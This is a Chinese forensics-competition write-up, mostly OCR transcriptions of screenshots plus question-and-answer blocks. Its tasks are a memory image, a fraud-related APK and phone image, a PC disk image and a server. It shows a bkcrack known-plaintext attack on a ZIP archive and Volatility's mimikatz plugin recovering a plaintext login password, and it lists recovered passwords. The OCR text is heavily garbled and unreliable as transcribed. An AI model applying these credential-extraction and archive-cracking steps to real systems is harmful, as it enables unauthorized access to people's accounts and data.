<!-- 这是一张图片，ocr 内容为：X 十 OUT.TXT 编辑查看 文件 2 R--R-D \DEVICE\HARDDISKVOLUME2VWINDOWS\SVSWOW64\WININET-DL1 7 0X000000007E413970 EE 0X000000007E413C20 9 X安人个 V 152ZZ\DESKTOP INDOWS-SHELL-SOUNDTHEMES- 14 0X000000007E414750 PACKAGE~31BF3856AD364E35~AMD64WB.1.7000.16305.CAT 0X00000007E414F20 PACKAGE~31BF3856AD364E35~AMD64~6.1.7601.17514.CAT 0X000000007E41E3A0 0 R--N-D \DEVICE\HARDDISKVOLUMEZ\WINDOWS\SYSTEM32\DRIVERS\NDISTAPI.SYS 15 0 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSWOW64\IERTUTIL.DL1 0X000000007E41E650 16 0X000000007E41F830 0 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\S WS\SWOW64\NORMALIZ.DLL 1S/SYSTEN32/CATROOT)(F750F6C3-38EE-11D1-85ES-00C8AFC295EEJMICROSOFT-VINDONS-NOBILEP(-CLIENT-SENSORS- 0X000000007E422050 O R--R--/ DEVICE\HARDDISKVOLUME2\WINDOWS\S\S\S PACKAGE~31BF3856AD364E35~AMD64-ZH-CN~6.1.7601.17514.CAT EX00000087E4223A0 FILES\MOZILLA FIREFOX\API-MS-WIN-CRT-LOCALE-11-11-0.DLL 0X00000007E4225D0 0 R--R--\DEVICE\HARDDISKVOLUME2\WINDOWS 515YSTAN3Z/CATROOT/(F750E5C3-38EE-11D1-85E5-90C04FC295E295EE)MICROSOFT-WINDOUS-SNIPPINGTOOL-PACKABE~ 31BF3856AD364E35~AMD64-EN-US~6.1.7600.16385.CAT 0X00000007E422E90 OR--R--\DEVICE\HARDDISKVOLUME2 2 WINDOWS 1SYSTEN32/CATROOT/(F750E6C3-38EE--1101-85ES-90C84FC295EEJMICROSOFT-HICROS-MINDOUS-MOCILENT-SENSORS- PACKAGE~31BF3856AD364E35~AMD64-EN-US~6.1.7601.17514.CAT EX000000007E4241A0 16 16 R--P--P--\DEVICE\HARDDISKVOLUME2\WIN 2\WINDOWS \SYSTEM32 YSTEN32/CATROOT/(F750E6C3-38EE-11DI-85ES-09C0AFC295EE) MOBILEROSOFT-MINDOUS-MOBILERC-CLIENT-SENSORS- PACKAGE~31BF3856AD364E35~AMD64~-6.1.7600.16385.CAT 0 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\S 0X000000007E4244A0 2\MSMPEG2ADEC.D11 S\SYSTEM32\ 16 \CATROOT\[F750E6C3-38EE-11D1-85ES-80C04FC295EE>\MICROSOFT-WINDOWS-SNIPPINGTOD 16 0X000000007E424A10 GTOO1-P \DEVICE\HARDDISKVOLUME2\WINDOWS\SYS PACKAGE STEM32 0 R-I 31BF3856AD364E35~AMD64~6.1.7600.16385.C 5385.CAT 0X00000007E424DC0 @CATROOT\{F750E6C3-38EE-11D1-85ES-00C04FC295EEPMICROSOFT-WINDOWS-SNIPPINGTOOL-PACKAGE* P--/DEVICE\HARDDISKVOLUME2\ WINDOWS SYSTEM3 20 R--R- 31BF3856AD364E35~AMD64~ZH-CN~6.1.7601.1 601.17514.CAT CE\HARDDISKVOLUME2\WINDOWS\SYSWOW64\CRYPT32.DLL 0R-R-D DEVICE HA 0X000000007E426980 9 1 RH-R-D \DEVICE\HARDDISKVOLUME2WINDOWS\SYSTEM32/WDI\LOGFILES WDICONTEXTLOG.ETLOG.ETL.002 1 0X000000007E426DC0 0 RW-RWD \DEVICE\HARDDISKVOLUME2\$DIRECTORY 33 0X000000007E427630 6 0 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSWOW64\SECHOST.DL1 0X000000007E4279E0 366 O RW-RWD \DEVICE\HARDDISKVOLUME2\$DIRECTORY 0X000000007E427E20 \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\DRIVERS\RASPPPOE.SYS 0R-R-D \DEVICE 0X000000007E42A530 0X000000007E42B180 31BF3856AD364E35~AMD64~6.1.7601.17514.CAT 0R-R-D\4 D \DEVICE\HARDDISKVOLUME2\PROGRAM FILES\MOZILLA FIREFOX\MOZAVUTIL.DLL 0X000000007E42B7D0 664 8 R---- NDEVICELHARDAISKYOLUMEZ)WINDOUSISYSTEN32/CATROOT)/F750E-38E663-38EE-11DL-85E5-60CEAJLPRNEPE8S 0X000000007E42E540 0 R-R-- 0X000000007E42E890 16 /DEVICE\HARDAISKVOLUNEZ MINDOUS\SYSTEN3Z) (PRNE3,CATROOT\/F758EE-11D1-35ES-35ES-08C235E)(PRNEPO83,CAT 0R-P-- 0X000000007E42EAC0 0X00000007E431330 8 R-TIN- NDEVICOTHARDASTILALUMEZ)USERS'S3ZZ MBROATA LLOCAL  PROZILA LENEZ PROFILES BXIFESB7,DEFOULT C 18E238F7047FE2FB811E07B6D864B1B02149C03BC O RW-R--\DEVICE\HARDDISKVOLUME2\USERS\S2ZZ\DESKTOP\README.TXT 0X000000007E434590 16 0 R--RW- 16 0X000000007E434730 0 R--P-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSTEM32\WBEM\NTEVT.D11 0X000000007E434880 4 0X00000007E434D10 ISYSTEM.TRANSACTIONS.NI.DLL 0X000000007E435370 0 R--P-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSWOW64\MSCTF.DL1 15 11 0X000000007E4358B0 0 R--R-D \DEVICE\HARDDISKVOLUME2\WINDOWS\SYSWOW64\C1BCATQ.DL1 行2165,列83 UTF-16 LE 100% WINDOWS (CRLF) -->


但是readme.txt不能明文出压缩包，editbox查看历史

<!-- 这是一张图片，ocr 内容为：X 十 WINDOWS POWERSHELL 4044 PROCESS ID IMAGEFILENAME NOTEPAD.EXE ISWOW64 NO 6.0.7601.17514!EDIT ATOM_CLASS 0X372600 VALUE-OF WNDEXTRA 94 NCHARS 94 SELSTART 94 SELEND ISPWDCONTROL FALSE UNDOPOS 32 UNDOLEN ADDRESS-OF UNDOBUF: 0X3589F0 THIS IS THE TABLE TO GET THE KEY UNDOBUF TENT OF README.TXT FOR YOU TO MAKE THE KNOW-PLAINTEXT ATTACK? DO YOU THINK I WILL LEAVE THE CONT 1\WINSTAO/DEFAULT WND CONTEXT PROCESS ID 1416 IMAGEFILENAME WINRAR.EXE ISWOW64 NO 6.0.7601.17514!EDIT ATOM_CLASS VALUE-OF WNDEXTRA 0X4436A0 51 NCHARS R SELSTART 51 SELEND ISPWDCONTROL FALSE R UNDOPOS -->


<!-- 这是一张图片，ocr 内容为：ROOT@KALI: 2 编辑查看帮助 动作 文件 [ROOT@KALI)-[~] /ROOT/DESKTOP/MEM.RAW GREP 'SECRET' STRINGS SECRET-U2FSDGVKX19DH IROKENRTSBA7K9ASDPAZ8L45VR959D2Y19/0X5XL6LENHDOVOIETSMEILHJIPPGOUSSDXGRR2JZQOOFEMF /VGLASRHWUMM- /VGLASRHWUMM /VGLASRHWUMM SECAET-U2FSDOYKXI9GHYROKCNFT58AJK9A50PAZ8L45V59595959/OXSXSXLOXSXLOLENNDOVOILHJJBROOUSSDXGST23323200F /VGLASRHWUMM /VGLASRHWUMM /VGLASRHWUMM /VGLASRHWUMM SECHET-UZESDAYKX1JDHVROKENETSBAJK9ASDDAZ8L45VE959595959/OXSXLALENNDOVOZETSMEILHZJBPOOUSSDXGER33330FEN /VGLASRHWUMM /VGLASRHWUMM- SECNET-UZFSDOVKX19DHYROKGNRTSBAYK9ASOPAZ8L45VE9595959/OXSXLOXSXLOLENNDOVOIETSMAILHJJPPOOUSSDXGS2300FE /VGLASRHWUMM /VGLASRHWUMM SECRTT-U2FSDSVKX19DHYROKENETSBAYK9ASOPAZ8L45YEL4595959/OXSXLOXSXLEMNDDVOIETSMAILHJJPPOOUSSZ3323290FEN /VGLASRHWUMM SECRET-UZFSDSVKXIJDHYROKCNRTSBAYK9ASOPAZ8L45YE9595902Y59/OXSXLOLENADOYOIETSNEILHJIPPCONSSDXGRT23200FE /VGLASRHWUMM SECRET-U2FSDGVKX19DHYROKCNRT5BAJK9ASDPAZ SECRETEUZFSDSVKX19DHYROKENRTSBAZK9A50PAZ8L45YT9595902Y19/OXSXLOXSXLENNDOVOILHJJPPCOUSSDXSERZ32000FEN /VGLASRHWUMM STCHBTENNDSYKXISDHYROKENTTSBASK9A50OUSSDXGL45VT95959/0XSX59/OXSXLOLENNDOVOILHZJOPOOUSSDXGER3333300FEN /VGLASRHWUMM -->


```plain
U2FsdGVkX19dHyROKCNrT5BAJk9asDpaZ8L45vr9s9D2Yi9/OX5Xl6lEmhd0VoietsmeiLHJjPPG0uSsdxGgr2jzQ00FEMf/VglaSrhwumM=
```

<!-- 这是一张图片，ocr 内容为：(ROOTS KALI)-[~] README.TXT -P /ROOT/DESKTOP/READ /ROOT/BKCRACK/INSTALL/BKCRACK -C /ROOT/DESKTOP/TABLE.ZIP -C README.TXT ME.ZIP 2023-03-25 BKCRACK 1.5.0 [07:19:24] Z REDUCTION USING 25 BYTES OF KNOWN PLAINTEXT 100.0%(25 / 25) [07:19:24] ATTACK ON 300807 Z VALUES AT INDEX 6 1.3 %(4012 / 300807) -->


但是解出的密钥无法写出压缩包，尝试重置密码

<!-- 这是一张图片，ocr 内容为：(ROOTS KALI)-[~] README.TXT -P /ROOT/DESKTOP/READ /ROOT/BKCRACK/INSTALL/BKCRACK -C /ROOT/DESKTOP/TABLE.ZIP -C README.TXT ME.ZIP 2023-03-25 BKCRACK 1.5.0 [07:19:24] Z REDUCTION USING 25 BYTES OF KNOWN PLAINTEXT 100.0%(25 / 25) [07:19:24] ATTACK ON 300807 Z VALUES AT INDEX 6 1.3 %(4012 / 300807) -->


解压修改table后缀为文件

<!-- 这是一张图片，ocr 内容为：5 3 4 6 6 2 B 1 7 8 C 0 F -->


对应 key 的鼠标轨迹解出  a91e37bf

在线网站解密出答案 

part2: 3a-f140-2626195942a0} the other part is in the password

前半部分在password里，尝试

<!-- 这是一张图片，ocr 内容为：个 TOOLS HELP RECOVER FILE PASSWORD PASSWORDS FOUND FILES RESOURCES PERFORMANCE LOG ATTACKS MEM.RAW C:> USERS>HK > DESKTOP FOLDER WEBSITES FROM A MEMORY IMAGE FILE TYPE COMPLEXITY .EEE LNSTANT UNPROTECTION C: >USERS> HK > DESKTOP >MEM.RAW 020A1DF0E3EEA83AA02C8DBD966BE395 MD5: WEBSITES PASSWORDS SITE: HTTP://66.40.9.246 ACCOUNTS' EWWWWIC PASSWORDS SITE:UNKNOWN WEBSITES FLAG{194A019A-1767-91 11111111 ACCOUNTS' PASSWORDS AVIR GEN CURRENT ATTACK 3 OF 6 PASSWORDS FOUND ESTIMATED TIME PROCESSING FILE 2 OF 3 ONEDRIVE TOKEN EXTRACTION MEM.RAW PASSWORDS ANALYZED TIME ELAPSED 38 SECONDS STOP SKIP ATTACK PAUSE SKIP FILE SKIP GROUP -->


  flag{194a019a-1767-913a-f140-2626195942a0}

# 取证
## 手机取证
<!-- 这是一张图片，ocr 内容为：X WINDOWS POWERSHELL 保留所有权利. 版权所有(C)MICROSOFT CORATION. 安装最新的 POWERSHELL,了解新功能和改进!HTTPS://AKA.MS/PSWINDOWS (PS C:\USERS\HK> KEYTOOL -PRINTCERT -FILE C: /USERS)HK(APPATALLOCAL/TEMP/ENP/ENESDLFB2ZIBE7Z/CERT,RS OID,OANDROID,ST,ST,CCN OID,0-ANDROID. ST,CN 序列号 563B45CA 有效期为 WED FEB 23 00:48:04 CST 2022 至 FRI JAN 30 00: IN 30 00:48:04 CST 2122 证书指纹: MD5:  F0:7C:E0:E7:FD:42:61:E5:B4:80:54:28:9F:A6:A6:AE SHA1:CA:BB:21:21:C6:19:16:48:27:F8:D2:C1:8D:E7:1A:B8:60:59:D2:11 SHA256;33;65;32;32;33;9E;47;4B;49;24;F9;4A;7A;7O;AO;333333;33;47;33;63;GE;AZ;49;CA:92;32;93;93;94;03 签名算法名称:SHA256WITHRSA 主体公共密钥算法:2048位RSA密钥 版本:3 扩展: #1:OBJECTID:2.5.29.14 CRITICALITYFALSE SUBJECTKEYIDENTIFIER [ KEYIDENTIFIER [ U.B.4.T3F].. 15 74 33 66 5D 8C 92 0000:CB A5 08 42 7B 34  AF 0010:9C  2C 94  FF PS C:\USERS\HK> VCASIOIN XH -->


<!-- 这是一张图片，ocr 内容为：INDROID:ALLCWCLEARUSERDATAS"TRUE" ANDROID:DEBUGGABLEWEALSE" ANDROID;ALL D:ICON "EDRAWABLE/ICON" ANDROID:NAME-"IO.DCLOUD.APPLLCALLON <APPLICATION AN ON ANDROID:LABEL-' OATRING/APP_NAME* AND MOTAROTTOLOLOTOTAOTMOTARONT -"IO.DCLOUD.PANDORAENTRY" ANDROID:LABEL-*@STRING/APP NAME" ANDROID:NAM INDROID:EXPORTED:"TRUE" ANDROID:SCREENORIENTATION-"USER" ANDROID:CONFIGC <ACTIVITY ANDROIG:THEME-"BSTYLE/DCLOUDTRANSLUCENTTHEME" <INTENT-FILTER> <ACTION ANDROID:NAME "ANDROID.INTENT.ACTION.MAIN" <CATEGORY ANDROID:NAME."ANDROID.INTENT.CATEDORY.LAUNCHER* /> </INTENT-FILTER> <INTENT-FILTER> <ACTION ANDROID:NAME "ANDROID.INTENT.ACTION.VIEW" <CATEGORY ANDROID:NAME-"ANDROID.INTENT.CATEGORY.DEFAULT" / <CATEGORY ANDROID:NAME-"ANDROID.INTENT.CATEGORY.BROWSABLE" /> </INTENT-FILTER> </ACTIVITY> ANDROID;EXPORTED-"LALGE" ANDROID:LAUNCHMODE-"SINGLETASK" ANDI ANDROID:LABEL-"@STRING/APP_NAME ANDROID:SC <ACTIVITY ANDROID:THEME-"GSTYLE/DCLOUDACTIVITYTHEME" <META-DATA ANDROID:NAME-"DCLOUD READ PHONE STATE". <META-DATA ANDROID:NAME "DCLOUD AD ID" ANDROID:VAL UE "1.29477173E11* <META-DATA SNDROID:NAME-"DCLOUD STREAMAPP CHANNEL" ANDROID:VALUE UNI.06 "COM.VESTAS.APPI. 065EC2411294771704101*/> -'DCLOUD UNISTATISTICS" ANDROID:VALUE-"TRUE <META-DATA ANDROID:NANE-" <META-DATA ANDROID;NAME-"  "ANDROID.NOTCH AUPPORT* ANDROID:VALUE-'TRUE" <META-DATA ANDROID:NAME,"NOTCH.CONFIG" ANDROID:VALUE-"PORTRAIT" /> <META-DATA ANDROID:NAMES"ANDROID.MAX.ASPECT" ANDROID:VALUES"2.5" /> IOROAOTIVITY" ANDROID:EXPORTEDE"FALSE" ANDROIDIACREENORIENTATIONE"BEHIND" ANDROID:CONFIGCHANG 8A"GSTYLE/DEVICEDEFAULT,LIGHT" ANDROIDINANS"SO,DALOND,FEATUREATURE-NATIVEDBJ PHORAVIEN,SBOTIVITY? ANG <ACTIVITY ANDROID:THEME-" <ACTIVITY ANDROID:THEME "( (RECOIVER ANAROLDINAMENTIO:DSLOUD.COMMAN,EDEPTER,IO,DONNLOADRECELVER" ANDROIDROIDIEXPORTEDATEAL9E" <INTENT-FILTER> <ACTION ANDROID:NAME-"ANDROID.INTENT.ACTION.PACKAGE ADDED" /> <DATA ANDROID:SCHEME-'PACKAGE* </INTENT-FILTER> -->


<!-- 这是一张图片，ocr 内容为：袋域名线索 CSV EXCEL 查询域名 域名 地区 金山 查询地区 IP CHINA -ZHEJIANG SERVICE.DCLOUD.NET.CN 47.111.67.154 开放端口 域名历史 查域名注册人 IP高精度定位 CHINA-ZHEJIANG 开放端口 47.99.97.167 域名历史 查域名注册人 STREAM.DCLOUD.NET.CN IP高精度定位 UNITED STATES OF AMERICA - CALIFORNIA 23.27.132.60 STREAM.MOBIHTML5.COM 域名历史 查域名注册人 开放端口 IP高精度定位 没有地区信息 没有IP信息 VIP.LICAI.COM 域名历史 查域名注册人 UNITED STATES OF AMERICA - CALIFORNIA 开放端口 104.18.22.19 WWW.W3.ORG 域名历史 查域名注册人 IP高精度定位 PREVIOUS SHOWING 11 TO 15 OF 15 ENTRIES NEXT -->


```plain
【APK取证】涉案apk的包名是？[答题格式:com.baid.ccs]
com.vestas.app

【APK取证】涉案apk的签名序列号是？[答题格式:0x93829bd]
0x563b45ca

【APK取证】涉案apk的服务器域名是？[答题格式:http://sles.vips.com]
https://vip.licai.com

【APK取证】涉案apk的主入口是？[答题格式:com.bai.cc.initactivity]
io.dcloud.PandoraEntry
```

## 手机取证
```plain
【手机取证】该镜像是用的什么模拟器？[答题格式:天天模拟器]
雷电模拟器
```

雷电模拟器还原镜像

<!-- 这是一张图片，ocr 内容为：雷电模拟器-19.0.57 士日 7:45 按键 搜索游戏或应用 加量 减量 VESTAS 可 全屏 雷电游戏中心 短信 维斯塔斯 与你 系统应用 浏览器 98 截图 多开 安装 设置 更多 新门派星宿登场 X 狂暴传奇 秦时明月:沧海 太古封魔录2 凡人修仙传:人界篇 天龙八部2:飞龙战天 -->


```plain
【手机取证】该镜像中用的聊天软件名称是什么？[答题格式:微信]
与你
```

<!-- 这是一张图片，ocr 内容为：文件管理器 R 首页 X 雷电模拟器-1 与你 士 7:50 A 按键 ANDROID DATA 加量 减量 父目录 3KWAN 全屏 2023/8/26下午7:43  DRWXRWX-- 截图 COM.ANDROID.FLYSILKWORM 多开 2023/8/26下午7:43  DRWXRWX-- 安装 COM.ANDROID.LAUNCHER3 2023/8/26 下午7:43  DRWX-- 设置 COM.CYANOGENMOD.FILEMANAGER 更多 2023/8/26下午7:49  DRWXRWX-- COM.UNEED.YUNI 2023/8/26下午7:48 DRWXRWX-- -->


```plain
【手机取证】聊天软件的包名是？[答题格式:com.baidu.ces]
com.uneed.yuni
```

<!-- 这是一张图片，ocr 内容为：与你 7:51 A 按键 王哥 占 对方已不是你的好友,点击删除会话 加量 6月25日14:20 减量 毕竟5万也不是小数目 全屏 截图 嗯嗯 多开 APK 安装 你先考虑考虑 设置 更多 毕竟机会不等人 早投早赚钱 6月25日14:52 刚刚跟华哥也在聊 请输入消息... -->


```plain
【手机取证】投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]
5万
```

<!-- 这是一张图片，ocr 内容为：与你 7:52 A 按键 王哥 占 对方已不是你的好友,点击删除会话 加量 减量 早投早赚钱 全屏 截图 6月25日14:52 多开 刚刚跟华哥也在聊 APK 安装 设置 感觉还是挺靠谱的 更多 我跟华哥都买了5万的 6月25日14:59 没什么问题的 我自己都在买 请输入消息... -->


```plain
【手机取证】受害人是经过谁介绍认识王哥？[答题格式:董慧]
华哥
```



## 计算机取证
<!-- 这是一张图片，ocr 内容为：取证大师试用版 当前密例:CASE01-20230826-195831 文件(F) 工具() 设置(S)视图(V) 开动(H) 老服 接案 数据分析 小程序 时问就 取证结果 变例管理 雨车 设备 列味 解密 过滤结果 文件名:密萄 窗码 高级过滤 签名 文件类型 惊改时间了到除时间 访问时间 文件分类 逻辑大小(字节) 标签 创建时间 京号 文件名 30023001-20230026-195031 TXT文本文件 2023-06-21 0. 办公文档 2023-06-210 2023-06-210 常用文件夹 S-C口-ZI计算机/PG.EO1 密码 西口四分区1系统保留(C) 由CCE分区2本地道急[D] 文件 杭州 80CE分区3水地鸡盘() 电脑:YANG88/3W.QAX.COM VC: 3W.QAX.COM!I0G 文本 十六进制 梅安 文件名:密乳 文件扩展名:TIT 透涌大小(字节):49 访问时间:2023-06-21 00:20:29 文件类型:TXT文本文件 提速:文件,存档 物理大小(字节):49 物理位置:72.468.472.686 原始路:2:1计算机(PE 8011分区 本地路盘[]: 武塑路经: CASE01-20230626-186831LIT:预计算机\PO 301% 系引进配未开始 -->


```plain
【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root/admin]
yang88/3w.qax.com

【计算机取证】请给出嫌疑人Vera Crypt加密容器的解密密码？[答案格式：admin!@#]
3w.qax.com!!@@

veracrypt解密后挂载打开xlsx
【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]
1019
```

<!-- 这是一张图片，ocr 内容为：盘古石计算机取证分析系统 AA 预计剩余时间:00:03:20 0% 任务中心 导出 PC.E01 取证 案件列表 图 计剪哈希值 添加书签 复制全路径 标记 创建烧饼 口园文件系统 图库 音视频车 PC.E01 PC.E01 检材文件 PC.E01 么办么 AAMM 全选(0/5)三 显示列 园文件饮复(O) 954 口文件分类(13426) 记开始房区 SHA1 MDS 应用分析 :文件系统 物理大小 SHA256 华剧除状态 结束扇区 大小 名称 口圆PC.E01(13426) 安件-20230826-182534/文件系统/PC.EC 01 分区01系统保留 NTFS 2048 100 MB(1048... 品 100MB(1048...未制除 206847 3092-BDA8 02 案件-20230826-182534/文件系统/PC.E( 五分区02 本地磁盘(C] NTFS 205848 281880575 134 GB(14421..未剧除 搜索结果 9493-49FE 案件-20230826-182534/文件系统/PC  EC 73 弄分区03 本地磁盘[D] NTFS 281800576 122GB(13055.,未制除 536066815 案件-20230826-182534/文件系统/PC.EC 536866816 UNUSED  AREA 2 MB(2097152)未 536870911 结束府区 2 MB(2097152) 标签条目 O 2047 案件-20230826-182534/文件系统/PC.E( UNUSED AREA 1 MB(1048576) 1 MB(1048576)未删除 自动扇区 书签 预览 16进制 屈性 文本 名称:PC.E01 标签: 序列号: 物理大小:256 GB(274877906944) MD5:7E3790840F8300973FB80139650C6BA3 SHA256: SHA1:23F861B2E9C5CE9135AFC520CBD849677522F54C 结束房区:536870911 大小:256 GB(274877906944) 层川除状态:来重输除 路径:密件-20230826-182534/文件系统/PC_E01 工只箱 版本:R7.1.5P2 16核心CPU 宝件-20230826-182534/文件系统/PC F01 内存 15.0G/10.0G -->


```plain
【计算机取证】请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]
23f861b2e9c5ce9135afc520cbd849677522f54c
```

## 内存取证
<!-- 这是一张图片，ocr 内容为：X WINDOWS POWERSHELL WINDOWS POWERSHELL 版权所有(C) MICROSOFT CORATION.保留所有权利. 安装最新的 POWERSHELL,了解新功能和改进!HTTPS://AKA.MS/PSWINDOWS 6\VOLATILITY.EXE -F Z:\计算机\MEMDUMP.MEM IMAGEINFO VOLATILITY FOUNDATION VOLATILITY FRAMEWORK 2.6 INFO VOLATILITYDEBUG : DETERMING PROFILE BASED ON KDBG SEARCH. SU9GESTED PROFILE(S): WIN7SPIXAN, WIN7SPEX84, WINZON, WINZ90ARZSPOX6H, WINZOBAXAN,2UED, WIN2088R2SPL WIN2008R2SP1X64, WIN7SP1X64_24000, WIN7SP1X64_23418 WINDOWSAMD64PAGEDMEMORY (KERNEL AS) AS LAYER1: FILEADDRESSPACE(Z:\计算机\MEMDUMP.MEM) AS LAYER2 PAE TYPE NOPAE DTB OX187000L 0XF80004043120L KDBG NUMBER OF PROCESSORS 8 IMAGE TYPE (SERVICE PACK) 1 KPCR FOR CPU : 0XFFFFF80004045000L KPCR FOR CPU 1 :OXFFFF88000000L KPCR FOR CPU 2: :0XFFFF8800457D000L KPCR FOR CPU 3 :0XFFFFF880009AF000L KPCR  FOR  4 :0XFFFFFF8800000L KPCR FOR CPU 5 :OXFFFF880046BD000L KPCR FOR CPU 6:0XFFFFF8800473A00L 粤XFFFFF880047B7000L KPCR FOR CPU 7 0XFFFFF7800000000L KUSER_SHARED_DATA IMAGE DATE AND TIME 2023-06-20 17:02:27 UTC+0000 2023-06-21 01:02:27 +0800 IMAGE LOCAL DATE AND TIME : UPS C:\USERS\HK\DESKTOP\取证\VOLATILITY\VOLATILITYWORKBENCH2.6> -->


```plain
【内存取证】请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]
2023-06-21 01:02:27
```

<!-- 这是一张图片，ocr 内容为：-(ROOTSKALI)-[~] /ROOT/DESKTOP/MEMDUMP.MEM --PROFILE-WIN7SP1X64 MIMIKATZ VOL.PY -F  FOUNDATION VOLATILITY VOLATILITY FRAMEWORK 2.6.1 (NAMEERROR: NAME 'DISTORM3' IS NOT DEFINED) PLUGINS.MALWARE.APIHOOKS IMPORT VOLATILITY.PLUGI *** FAILED TO (NAMEERROR: NAME 'DISTORM3' IS NOT DEFINED) IMPORT VOLATILITY.PLUGINS.MALWARE.THREADS *** FAILED TO TY.PLUGINS.MAC.APIHOOKS_KERNEL IMPORT VOLATILITY.P (IMPORTERROR: NO MODULE NAMED DISTORM3) *** FAILED TO -SHADOW (IMPORTERROR: NO MODULE NAMED DISTORM *** FAILED TO IMPORT VOLATILITY.P PLUGINS.MAC.CHECK_SYSCALL. 3) IMPORT VOLATILITY PLUGINS.SSDT (NAMEERROR: NAME 'DISTORN3' IS NOT DEFINED) FAILED TO Y.PLUGINS.MAC.APIHOOKS (IMPORTERROR: NO MODULE NAMED DISTORM3) FAILED TO IMPORT 水火 VOLATILITY.P USER DOMAIN MODULE PASSWORD YANG88-PC 3W.QAX.COM WDIGEST YANG88 YANG88-PC$ WORKGROUP WDIGEST -->


```plain
【内存取证】请给出计算机内用户yang88的开机密码？[答案格式：abc.123]
3w.qax.com
```

<!-- 这是一张图片，ocr 内容为：WINDOWS POWERSHELL 106 2023-06-20 16:46:27 UTC+000 552 2236 8 OXFFFFFA801ABE0B00:SVCHOST.EXE 93 2023-06-20 16:46:26 UTC+000 552 3 2028 OXFFFFFA801AA818DE:VGAUTHSERVICE. 552 4452 480 2023-06-20 17:05:37 UTC+000 OXFFFFFA801A487B00:TASKHOST.EXE 6 552 280 2023-06-20 16:46:26 UTC+000 0XFFFFFA801A9C8B00:SVCHOST.EXE 1876 11 552 396 352 2023-06-20 16:48:29 UTC+000 OXFFFFFA801A6FD9A0:SVCHOST.EXE 13 484 0XFFFFFA801A490B00:LSASS.EXE 643 2023-06-20 16:46:08 UTC+0000 584 9 484 10 592 @XFFFFA801A491060:LSM.EXE 170 2023-06-20 16:46:08 UTC+000 1416 31 1448 1218 2023-06-20 16:46:21 UTC+000 OXFFFFFA801A7D4B00:EXPLORER.EXE 4608 793 2023-06-20 16:58:30 UTC+0000 1448 51 OXFFFFFA801B064B00:WPS.EXE 4608 178 2023-06-20 16:59:56 UTC+000 4372 17 OXFFFFA801AFB3060:WPS.EXE OXFFFFFA801B2A98EO:PROMECEFPLUGIN 4608 4336 2023-06-20 239 16:59:56 UTC+0000 10 4608 231 2023-06-20 16:59:56 UTC+0000 4548 OXFFFFFA801AF246E0:WPS.EXE 17 2023-06-20 16:58:31 UTC+0000 4608 4624 0XFFFFA801AE33060:ET.EXE R 4624 1040 2023-06-20 16:58:33 UTC+000 0XFFFFFA801B099B00:WPSCLOUDSVR.EX 5036 96 238 2023-06-20 16:58:36 UTC+0000 5036 1820 10 OXFFFFFA80199E9390:PROMECEFPLUGIN 8 2023-06-20 16:58:36 UTC+000 5036 3740 17 178: 0XFFFFA801AFB7060:WPS.EXE 5036 OXFFFFFA801B2E5340:PROMECEFPLUGIN 2228 385 2023-06-20 16:58:36 UTC+000 13 5036 218 2023-06-20 16:58:36 UTC+000 3276 17 0XFFFFA801A7C7060:WPS.EXE 4608 OXFFFFFA801AFD5A70:PROMECEFPLUGIN 260 2023-06-20 16:59:56 UTC+000 2188 10 1448 354 2023-06-20 17:02:05 UTC+000 4044 OXFFFFFA801B30C670:FTK IMAGERCHS. 8 1448 2996 297 2023-06-20 16:46:30 UTC+000 5 OXFFFFFA801ADED860:STARWINDMANAGE 1448 94  2023-06-20 16:55:31 UTC+000 OXFFFFFA801B15C370:NOTEPAD++.EXE 1468 2 1448 3416 849 2023-06-20 16:47:41 UTC+000 OXFFFFFA801AB3B8B0:VERACRYPT.EXE 13 1448 206 2023-06-20 16:46:25 UTC+000 1576 9 OXFFFFFA801A7FEB00:VMTOOLSD.EXE 944 2023-06-20 16:54:45 UTC+0000 1448 3780 31 OXFFFFA801AD47060:CHROME.EXE 3780 2456 193 2023-06-20 16:56:51 UTC+000 OXFFFFA801AD3C400:CHROME.EXE 11 92  2023-06-20 16:54:45 UTC+000 3780 9 2708 OXFFFFFA801ACE6B00:CHROME.EXE 224 2023-06-20 16:54:45 UTC+000 OXFFFFFA801AF97370:CHROME.EXE 1656 3780 14 134  2023-06-20 16:54:45 UTC+000 8 3788 3780 OXFFFFA801AEE05F0:CHROME.EXE 266 2023-06-20 16:54:46 UTC+000 18 3780 148 OXFFFFFA801B19F600:CHROME.EXE -->


```plain
【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11 00:00:00]
2023-06-21 00:47:41
```

## 服务器取证
<!-- 这是一张图片，ocr 内容为：盘古石计算机取证分析系统 AA 全部 任务中心 取证 导出 案件列表 日用 园 间 打开父日录 计算哈希值 导出列表 展开复合文件 标记 添加书签 特征分析 复制全路径 导出文件 复制单元格文本 口园文件系统 音视频库 阳率 V9.LLCAL.COM V9.LICAI.COM 检材文件 #M-UF4LXBMGMY9MZSO... 必办公 全球(0/28) 显示列 AZ CENTOS(VOLUMEGROUP) 经大小 足扩展名 最后访问时间 MD5 ?创建时间 应用分析 物理大小 SHA256 删除状态 修改时间 名称 (L) ROOT(LOGLCALVOLUME) 213 B(213) 4 KB(4096) 2019-02-26 15:42:50+08 [EDLTORCONFIG 2023-08-1804:48:21+08 品 未删除 EDITORCONFIG 口 ROOT 否 4 KB(4096) RECYCLE BIN 2023-08-18 02:04+08 2023-08-18 05:03:01+08 未来除 LENV 搜索结果 CNV CLUSERS`HINAPPDATAYLOCALTEMPLYENY-NOTEPAD 4 [ADMINISTRATOD E EDIT SEARCH VIEW ENCODING LANGUAGE RUN PLUGINS WINDOW ? UAGE SETTINGS TOALS MACRO RUN 标签条目 日司 APP MAHE-LARAVELGLOBALBONUA 书签 APP HEY-DASE64:+904LHGOJGJOG90EDREOKK/91JEIK-BG31LG+NZD+H- SAPP DEBUG-TAL9E APP URL-HSUPA//LOOALHOST LOG CHANNEL-STACK DE CONNECTION-WY9Q1 